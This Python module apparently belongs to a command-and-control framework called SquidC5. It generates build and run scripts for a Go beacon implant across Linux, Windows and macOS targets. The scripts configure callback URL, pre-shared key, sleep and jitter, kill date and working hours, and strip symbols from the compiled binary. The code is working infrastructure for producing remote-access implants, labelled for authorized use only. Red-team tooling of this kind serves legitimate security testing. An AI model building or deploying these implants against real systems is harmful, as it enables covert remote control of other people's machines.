"""Implant build factory — emits build scripts and agent config (authorized only)."""

from __future__ import annotations

import json
import textwrap
from pathlib import Path
from typing import Any

SUPPORTED = {
    ("linux", "amd64"),
    ("linux", "arm64"),
    ("windows", "amd64"),
    ("windows", "386"),
    ("darwin", "amd64"),
    ("darwin", "arm64"),
}


def build_plan(
    *,
    os_name: str,
    arch: str,
    host: str,
    port: int,
    path: str = "/api/v1/implant/beacon",
    scheme: str = "https",
    sleep: float = 5.0,
    jitter: float = 20.0,
    kill_date: int | None = None,
    max_miss: int = 0,
    work_start: int = 0,
    work_end: int = 0,
    psk_placeholder: str = "${SC5_PSK}",
) -> dict[str, Any]:
    os_l = os_name.lower().strip()
    arch_l = arch.lower().strip()
    if (os_l, arch_l) not in SUPPORTED:
        raise ValueError(f"unsupported target {os_l}/{arch_l}; allowed={sorted(SUPPORTED)}")
    sch = scheme if scheme in ("http", "https") else "https"
    url = f"{sch}://{host}:{port}{path}"
    ext = ".exe" if os_l == "windows" else ""
    out_name = f"sc5beacon-{os_l}-{arch_l}{ext}"

    env_lines = [
        f"export SC5_URL={json.dumps(url)}",
        f"export SC5_PSK={psk_placeholder}",
        f"export SC5_SLEEP={sleep}",
        f"export SC5_JITTER={jitter}",
    ]
    if kill_date:
        env_lines.append(f"export SC5_KILL_DATE={int(kill_date)}")
    if max_miss:
        env_lines.append(f"export SC5_MAX_MISS={int(max_miss)}")
    if work_start or work_end:
        env_lines.append(f"export SC5_WORK_START={int(work_start)}")
        env_lines.append(f"export SC5_WORK_END={int(work_end)}")

    build_sh = textwrap.dedent(
        f"""\
        #!/bin/sh
        # SquidC5 implant factory — authorized use only
        set -e
        cd "$(dirname "$0")/../../agents/sc5beacon" 2>/dev/null || cd agents/sc5beacon
        go mod tidy
        GOOS={os_l} GOARCH={arch_l} go build -ldflags='-s -w' -o ../../../dist/{out_name} .
        echo "built dist/{out_name}"
        """
    )

    run_sh = "#!/bin/sh\n# authorized use only\n" + "\n".join(env_lines) + f"\nexec ./dist/{out_name}\n"

    return {
        "os": os_l,
        "arch": arch_l,
        "output": out_name,
        "url": url,
        "env": {
            "SC5_URL": url,
            "SC5_SLEEP": sleep,
            "SC5_JITTER": jitter,
            "SC5_KILL_DATE": kill_date,
            "SC5_MAX_MISS": max_miss,
        },
        "build_script": build_sh,
        "run_script": run_sh,
        "notes": [
            "Copy server data/implant_psk.txt to SC5_PSK on the target side only",
            "Prefer TLS verify on (tls_skip_verify=false) with real certs or redirector",
            "Authorized testing only",
        ],
        "agent_path": "agents/sc5beacon",
    }


def agent_source_tree(root: Path | None = None) -> list[str]:
    base = root or Path(__file__).resolve().parents[3] / "agents" / "sc5beacon"
    if not base.is_dir():
        return []
    return sorted(str(p.relative_to(base)) for p in base.rglob("*") if p.is_file())
